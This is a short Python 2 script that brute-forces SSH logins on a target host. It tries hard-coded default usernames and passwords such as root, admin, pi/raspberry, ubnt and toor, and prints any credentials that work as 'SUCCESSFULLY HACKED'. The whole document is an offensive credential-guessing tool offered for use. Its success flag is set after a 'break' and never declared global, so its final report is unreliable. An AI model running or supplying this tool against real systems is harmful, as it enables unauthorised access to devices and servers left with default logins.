#!/usr/bin/env python2
import argparse, os, sys, time
from pexpect import pxssh
usernames = ["admin", "root", "user", "sysadmin", "username", "raspberry", "pi", "linux", "ubnt", "kali"]
passwordlist = ['admin', 'pass', 'password', '12345', 'toor', "linux", "pi", "raspberry", "linux", "ubnt", "money"]
hacked = False
def cli():
	global args
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', help="Target To Scan")
	args = parser.parse_args()
class Scanner:
	def __init__(self):
		#initalize object
		pass
	@classmethod
	def scan(self):
		target = str(args.target)
		print "[!] Attempting To Hack Target\nPlease Be Patient,\nThis could take a long time."
		
		try:
			for user in usernames:
				for passw in passwordlist:
					try:
						s = pxssh.pxssh()
						s.login(target, user, passw)
						print "[+] SUCCESSFULLY HACKED %s" % target
						print "[+] USERNAME:",user
						print "[+] PASSWORD:",passw
						break
						hacked = True
					except pxssh.ExceptionPxssh:
						s.close()
		except KeyboardInterrupt:
			print "Interrupted By User"
			quit()
def getresults():
	if hacked == True:
		sys.exit()
	else:
		print "\n[-] Failed To Hack Target\nExiting Program.."
		time.sleep(1.5)
		sys.exit()
if __name__ == '__main__':
	cli()
	Scanner.scan()
	getresults()
